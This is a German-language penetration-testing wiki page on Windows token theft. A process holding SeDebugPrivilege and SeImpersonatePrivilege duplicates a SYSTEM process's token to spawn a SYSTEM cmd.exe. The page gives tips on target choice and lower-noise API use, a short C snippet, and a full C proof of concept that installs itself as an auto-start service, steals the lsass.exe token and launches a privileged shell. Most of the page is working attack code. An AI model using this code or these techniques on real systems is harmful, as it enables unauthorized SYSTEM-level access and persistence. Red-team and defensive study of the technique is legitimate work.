# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

Diese Seite behandelt die **manuelle Token-Theft**-Variante, bei der ein **High Integrity**-Kontext, der bereits **`SeDebugPrivilege`** und **`SeImpersonatePrivilege`** hat, einen geeigneten **SYSTEM**-Prozess öffnet, dessen Token **dupliziert** und mit diesem Token einen neuen Prozess **startet**.

Wenn du nur schnell eine `SYSTEM`-Shell aus einem privilegierten Admin-Prozess brauchst, schau dir auch an:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

Wenn du **keinen** Prozess-Handle-Pfad hast, aber **`SeImpersonatePrivilege`** besitzt, ist der **named-pipe / Potato**-Weg normalerweise einfacher:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Quick triage

Bevor du den Token-Copy-Pfad ausprobierst, bestätige, dass der aktuelle Prozess bereits in einem nützlichen Kontext ist:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Hinweise:

- **`SeDebugPrivilege`** ist das, was dir erlaubt, viele **nicht geschützte** SYSTEM-Prozesse zu öffnen, selbst wenn ihr DACL dich normalerweise blockieren würde.
- **`SeImpersonatePrivilege`** ist das, was **`CreateProcessWithTokenW`** danach praktisch nutzbar macht.
- Wenn der Token-Copy-Pfad dir nur einen schwachen oder gefilterten SYSTEM-Token gibt, stehle einfach von einem **anderen SYSTEM-Prozess**.

## Wähle den Zielprozess sorgfältig aus

Die Technik wird meist gegen **`lsass.exe`** gezeigt, aber auf modernen Windows-Systemen ist das oft das **falsche Ziel**:

- Wenn **LSA Protection / RunAsPPL** aktiviert ist, ist **`lsass.exe`** geschützt und ein normales Admin-Programm mit `SeDebugPrivilege` kann es trotzdem nicht öffnen.
- Bevorzuge **nicht-PPL SYSTEM-Prozesse** wie **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** oder eine frühe **`svchost.exe`**-Instanz.
- **Protected processes** und einige spezielle Prozesse wie **`System`** oder **`csrss.exe`** sind keine realistischen User-Mode-Ziele für diese Technik.
- Nutze **Process Hacker / Process Explorer** mit erhöhten Rechten, um zu verifizieren, ob das Ziel-Token tatsächlich die gewünschten Privilegien hat, bevor du es duplizierst.

## API-Details, die in der Praxis wichtig sind

Viele öffentliche PoCs fordern **`PROCESS_ALL_ACCESS`** und **`TOKEN_ALL_ACCESS`** an, aber das ist noisiger als nötig. In der Praxis:

- Öffne den Zielprozess nur mit den Rechten, die du brauchst (typischerweise **`PROCESS_QUERY_INFORMATION`** oder **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Öffne den Token mit den Rechten, die für die Prozesserstellung nötig sind: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Verwende **`DuplicateTokenEx(..., TokenPrimary, ...)`**, um einen **primären Token** zu erstellen; ein reiner Impersonation-Token reicht nicht aus, um einen neuen Prozess zu erstellen.
- Wenn **`CreateProcessWithTokenW`** mit **`1314`** fehlschlägt, wechsle zu **`CreateProcessAsUserW`**.
- Wenn du aus einem **Service / Session 0** heraus startest, denke daran, dass **`CreateProcessWithTokenW`** das Kind in der **Session des Aufrufers** belässt. Wenn du eine sichtbare Desktop-Shell brauchst, verwende **`CreateProcessAsUserW`** und verschiebe den Token in die gewünschte Session.

Ein minimaler moderner Ablauf sieht so aus:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Full service PoC

Der folgende Code **nutzt die Privilegien `SeDebugPrivilege` und `SeImpersonatePrivilege` aus**, um den Token von einem **Prozess, der als SYSTEM läuft**, und mit **allen Token-Privilegien** zu kopieren. In diesem Fall kann der Code kompiliert und als **Windows service binary** verwendet werden, um zu verifizieren, dass die Primitive funktioniert.

Der Hauptteil des **Codes, in dem die Privilegienerweiterung stattfindet**, befindet sich in der **`Exploit`**-Funktion. Innerhalb dieser Funktion kann man sehen, dass **`lsass.exe`** gesucht wird, sein **Token kopiert** wird und schließlich dieser Token verwendet wird, um eine neue **`cmd.exe`** mit allen Privilegien des kopierten Tokens zu starten.

Auf modernen Hosts möchtest du **`lsass.exe`** oft durch einen anderen **non-PPL SYSTEM process** wie **`winlogon.exe`**, **`wininit.exe`** oder **`services.exe`** ersetzen.

Andere Prozesse, die als SYSTEM mit allen oder den meisten Token-Privilegien laufen, sind: **`services.exe`**, **`svchost.exe`** (einige der ersten), **`wininit.exe`**, **`csrss.exe`**... Denk daran, dass du in der Regel **keinen Token von einem protected process kopieren kannst**.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## Referenzen

- [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [Configure added LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
